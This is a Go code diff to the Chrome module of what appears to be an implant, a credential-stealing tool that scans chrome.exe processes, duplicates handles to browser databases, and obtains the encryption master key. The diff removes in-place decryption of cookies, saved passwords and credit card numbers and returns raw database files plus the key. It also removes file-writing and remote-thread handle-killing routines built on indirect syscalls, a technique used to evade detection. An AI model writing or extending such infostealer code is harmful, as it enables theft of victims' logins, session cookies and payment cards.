@@ -1,15 +1,8 @@
 package chrome
 
 import (
-	"crypto/aes"
-	"crypto/cipher"
-	"database/sql"
-	"encoding/base64"
 	"encoding/hex"
-	"encoding/json"
 	"fmt"
-	"os"
-	"path/filepath"
 	"strings"
 	"syscall"
 	"time"
@@ -19,36 +12,17 @@ import (
 	"github.com/carved4/carved/implant/pkg/transport"
 
 	wc "github.com/carved4/go-wincall"
-	_ "modernc.org/sqlite"
 )
 
-type Cookie struct {
-	Profile string `json:"profile"`
-	Host    string `json:"host"`
-	Name    string `json:"name"`
-	Value   string `json:"value"`
+type RawFile struct {
+	Name    string
+	Data    []byte
+	Profile string
 }
 
-type Password struct {
-	Profile  string `json:"profile"`
-	URL      string `json:"url"`
-	Username string `json:"username"`
-	Password string `json:"password"`
-}
-
-type Card struct {
-	Profile    string `json:"profile"`
-	NameOnCard string `json:"name_on_card"`
-	Expiration string `json:"expiration"`
-	Number     string `json:"number"`
-}
-
-type Output struct {
-	Timestamp string     `json:"timestamp"`
-	MasterKey string     `json:"master_key"`
-	Cookies   []Cookie   `json:"cookies"`
-	Passwords []Password `json:"passwords"`
-	Cards     []Card     `json:"cards"`
+type ExtractionResult struct {
+	MasterKey []byte
+	Files     []RawFile
 }
 
 var (
@@ -248,7 +222,11 @@ func createPipeServer() uintptr {
 	return hPipe
 }
 
-func runExtraction(serverURL string) (*Output, error) {
+func Extract(serverURL string) (*ExtractionResult, error) {
+	config := &ExtractionResult{
+		Files: []RawFile{},
+	}
+
 	chromeProcs, err := ScanProcesses("chrome.exe")
 	if err != nil {
 		return nil, fmt.Errorf("scan processes: %w", err)
@@ -317,19 +295,6 @@ func runExtraction(serverURL string) (*Output, error) {
 	if len(foundHandles) == 0 {
 		return nil, fmt.Errorf("no chrome process found with required DB handles")
 	}
-	tmpDir := os.TempDir()
-	tempFiles := make([]struct {
-		path    string
-		profile string
-		dbType  string
-	}, 0)
-
-	// Ensure we clean up all temp files when we exit this function
-	defer func() {
-		for _, fileInfo := range tempFiles {
-			os.Remove(fileInfo.path)
-		}
-	}()
 
 	for i, info := range foundHandles {
 		data, _, err := ExtractFile(info.handle, info.pid)
@@ -337,21 +302,19 @@ func runExtraction(serverURL string) (*Output, error) {
 			continue
 		}
 
-		tmpPath := filepath.Join(tmpDir, fmt.Sprintf("chrome_%s_%d_%d.db", strings.ReplaceAll(info.dbType, " ", "_"), info.pid, i))
-		err = os.WriteFile(tmpPath, data, 0600)
-		if err != nil {
-			continue
-		}
-
 		profile := extractProfileName(info.path)
-		tempFiles = append(tempFiles, struct {
-			path    string
-			profile string
-			dbType  string
-		}{tmpPath, profile, info.dbType})
+
+		safeType := strings.ReplaceAll(info.dbType, " ", "_")
+		filename := fmt.Sprintf("chrome_%s_%d_%d.db", safeType, info.pid, i)
+
+		config.Files = append(config.Files, RawFile{
+			Name:    filename,
+			Data:    data,
+			Profile: profile,
+		})
 	}
 
-	if len(tempFiles) == 0 {
+	if len(config.Files) == 0 {
 		return nil, fmt.Errorf("failed to extract any database files")
 	}
 
@@ -442,43 +405,8 @@ func runExtraction(serverURL string) (*Output, error) {
 		return nil, fmt.Errorf("failed to retrieve master key from DLL")
 	}
 
-	output := Output{
-		Timestamp: time.Now().Format(time.RFC3339),
-		MasterKey: fmt.Sprintf("%X", masterKey),
-		Cookies:   []Cookie{},
-		Passwords: []Password{},
-		Cards:     []Card{},
-	}
-
-	for _, fileInfo := range tempFiles {
-		switch fileInfo.dbType {
-		case "Cookies":
-			cookies := extractCookies(masterKey, fileInfo.path, fileInfo.profile)
-			output.Cookies = append(output.Cookies, cookies...)
-		case "Login Data":
-			passwords := extractPasswords(masterKey, fileInfo.path, fileInfo.profile)
-			output.Passwords = append(output.Passwords, passwords...)
-		case "Web Data":
-			cards := extractCards(masterKey, fileInfo.path, fileInfo.profile)
-			output.Cards = append(output.Cards, cards...)
-		}
-	}
-
-	return &output, nil
-}
-
-func Extract(serverURL string) ([]byte, error) {
-	output, err := runExtraction(serverURL)
-	if err != nil {
-		return nil, err
-	}
-
-	jsonData, err := json.Marshal(output)
-	if err != nil {
-		return nil, fmt.Errorf("failed to marshal output: %w", err)
-	}
-
-	return jsonData, nil
+	config.MasterKey = masterKey
+	return config, nil
 }
 
 func extractProfileName(path string) string {
@@ -490,171 +418,6 @@ func extractProfileName(path string) string {
 		}
 	}
 	return "Default"
-}
-
-func decryptAESGCM(key, encrypted []byte) ([]byte, error) {
-	if len(encrypted) < 3+12+16 {
-		return nil, fmt.Errorf("encrypted data too short")
-	}
-	nonce := encrypted[3:15]
-	ciphertext := encrypted[15:]
-
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		return nil, err
-	}
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return nil, err
-	}
-	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
-	if err != nil {
-		return nil, err
-	}
-	return plaintext, nil
-}
-
-func extractCookies(masterKey []byte, dbPath string, profile string) []Cookie {
-	var cookies []Cookie
-	uri := "file:" + dbPath + "?mode=ro"
-	db, err := sql.Open("sqlite", uri)
-	if err != nil {
-		return cookies
-	}
-	defer db.Close()
-
-	rows, err := db.Query("SELECT host_key, name, encrypted_value FROM cookies")
-	if err != nil {
-		return cookies
-	}
-	defer rows.Close()
-
-	for rows.Next() {
-		var host, name string
-		var encValue []byte
-		if err := rows.Scan(&host, &name, &encValue); err != nil {
-			continue
-		}
-
-		if len(encValue) < 3 {
-			continue
-		}
-
-		prefix := string(encValue[:3])
-		if prefix == "v20" {
-			decrypted, err := decryptAESGCM(masterKey, encValue)
-			if err != nil {
-				continue
-			}
-			if len(decrypted) > 32 {
-				decrypted = decrypted[32:]
-			}
-			value := base64.StdEncoding.EncodeToString(decrypted)
-			cookies = append(cookies, Cookie{
-				Profile: profile,
-				Host:    host,
-				Name:    name,
-				Value:   value,
-			})
-		}
-	}
-
-	return cookies
-}
-
-func extractPasswords(masterKey []byte, dbPath string, profile string) []Password {
-	var passwords []Password
-	uri := "file:" + dbPath + "?mode=ro"
-	db, err := sql.Open("sqlite", uri)
-	if err != nil {
-		return passwords
-	}
-	defer db.Close()
-
-	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
-	if err != nil {
-		return passwords
-	}
-	defer rows.Close()
-
-	for rows.Next() {
-		var url, username string
-		var encPassword []byte
-		if err := rows.Scan(&url, &username, &encPassword); err != nil {
-			continue
-		}
-
-		if len(encPassword) < 3 {
-			continue
-		}
-
-		prefix := string(encPassword[:3])
-		if prefix == "v20" {
-			decrypted, err := decryptAESGCM(masterKey, encPassword)
-			if err != nil {
-				continue
-			}
-			if len(decrypted) > 32 {
-				decrypted = decrypted[32:]
-			}
-			passwords = append(passwords, Password{
-				Profile:  profile,
-				URL:      url,
-				Username: username,
-				Password: string(decrypted),
-			})
-		}
-	}
-
-	return passwords
-}
-
-func extractCards(masterKey []byte, dbPath string, profile string) []Card {
-	var cards []Card
-	uri := "file:" + dbPath + "?mode=ro"
-	db, err := sql.Open("sqlite", uri)
-	if err != nil {
-		return cards
-	}
-	defer db.Close()
-
-	rows, err := db.Query("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
-	if err != nil {
-		return cards
-	}
-	defer rows.Close()
-
-	for rows.Next() {
-		var nameOnCard string
-		var expMonth, expYear int
-		var encCardNumber []byte
-		if err := rows.Scan(&nameOnCard, &expMonth, &expYear, &encCardNumber); err != nil {
-			continue
-		}
-
-		if len(encCardNumber) < 3 {
-			continue
-		}
-
-		prefix := string(encCardNumber[:3])
-		if prefix == "v20" {
-			decrypted, err := decryptAESGCM(masterKey, encCardNumber)
-			if err != nil {
-				continue
-			}
-			if len(decrypted) > 32 {
-				decrypted = decrypted[32:]
-			}
-			cards = append(cards, Card{
-				Profile:    profile,
-				NameOnCard: nameOnCard,
-				Expiration: fmt.Sprintf("%02d/%d", expMonth, expYear),
-				Number:     string(decrypted),
-			})
-		}
-	}
-
-	return cards
 }
 
 func ScanProcesses(target string) (map[uint32][]Handle, error) {
@@ -882,132 +645,4 @@ func ExtractFile(hnd uintptr, owner uint32) ([]byte, string, error) {
 	}
 
 	return nil, "", fmt.Errorf("no filename")
-}
-
-func SaveFile(content []byte, dest string) error {
-	var abspath string
-	if len(dest) >= 2 && dest[1] == ':' {
-		abspath = dest
-	} else {
-		rtlGetCurDir := wc.GetFunctionAddress(ntdllBase, wc.GetHash("RtlGetCurrentDirectory_U"))
-		cwd := make([]uint16, 260)
-		n, _, _ := wc.CallG0(rtlGetCurDir, uintptr(len(cwd)*2), uintptr(unsafe.Pointer(&cwd[0])))
-		if n == 0 {
-			return fmt.Errorf("failed to get current directory")
-		}
-		cwdStr := syscall.UTF16ToString(cwd)
-		abspath = cwdStr + "\\" + dest
-	}
-
-	abspath = "\\??\\" + abspath
-
-	path16, err := syscall.UTF16FromString(abspath)
-	if err != nil {
-		return err
-	}
-
-	var ustr WideStr
-	ustr.Size = uint16((len(path16) - 1) * 2)
-	ustr.MaxSz = ustr.Size + 2
-	ustr.Data = &path16[0]
-
-	var objAttr ObjectAttributes
-	objAttr.Length = uint32(unsafe.Sizeof(objAttr))
-	objAttr.ObjectName = &ustr
-	objAttr.Attributes = 0x40
-
-	var iosb IoStatusBlock
-	var h uintptr
-
-	r, _ := wc.IndirectSyscall(
-		createFile.SSN,
-		createFile.Address,
-		uintptr(unsafe.Pointer(&h)),
-		uintptr(fileWriteData|fileAppendData|synchronize),
-		uintptr(unsafe.Pointer(&objAttr)),
-		uintptr(unsafe.Pointer(&iosb)),
-		0,
-		normalAttr,
-		0,
-		5,
-		0x00000020,
-		0,
-		0,
-	)
-
-	if r != statusSuccess {
-		return fmt.Errorf("failed to create file: %x", r)
-	}
-	defer wc.IndirectSyscall(closeHandleNt.SSN, closeHandleNt.Address, uintptr(h))
-
-	iosb = IoStatusBlock{}
-
-	r, _ = wc.IndirectSyscall(
-		writeFile.SSN,
-		writeFile.Address,
-		uintptr(h),
-		0,
-		0,
-		0,
-		uintptr(unsafe.Pointer(&iosb)),
-		uintptr(unsafe.Pointer(&content[0])),
-		uintptr(len(content)),
-		0,
-		0,
-	)
-
-	if r != statusSuccess {
-		return fmt.Errorf("failed to write file: %x", r)
-	}
-
-	return nil
-}
-
-func KillHandle(owner uint32, hnd uintptr) error {
-	var clientId struct {
-		pid uintptr
-		tid uintptr
-	}
-	clientId.pid = uintptr(owner)
-
-	var objAttr ObjectAttributes
-	objAttr.Length = uint32(unsafe.Sizeof(objAttr))
-
-	var proc uintptr
-	processCreateThread := uint32(0x0002)
-
-	if r, _ := wc.IndirectSyscall(
-		openProcess.SSN,
-		openProcess.Address,
-		uintptr(unsafe.Pointer(&proc)),
-		uintptr(dupHandle|processVmOp|processVmRead|processVmWrite|processCreateThread),
-		uintptr(unsafe.Pointer(&objAttr)),
-		uintptr(unsafe.Pointer(&clientId)),
-	); r != statusSuccess {
-		return fmt.Errorf("failed to open process: %x", r)
-	}
-	defer wc.IndirectSyscall(closeHandleNt.SSN, closeHandleNt.Address, uintptr(proc))
-
-	fn := closeHandleNt.Address
-	var thd uintptr
-
-	r, _, _ := wc.CallG0(
-		createThread,
-		uintptr(proc),
-		0,
-		0,
-		0,
-		0,
-		0,
-		fn,
-		uintptr(hnd),
-		uintptr(unsafe.Pointer(&thd)),
-		0,
-	)
-
-	if r != statusSuccess {
-		return fmt.Errorf("failed to create remote thread: %x", r)
-	}
-	wc.IndirectSyscall(closeHandleNt.SSN, closeHandleNt.Address, uintptr(thd))
-	return nil
 }
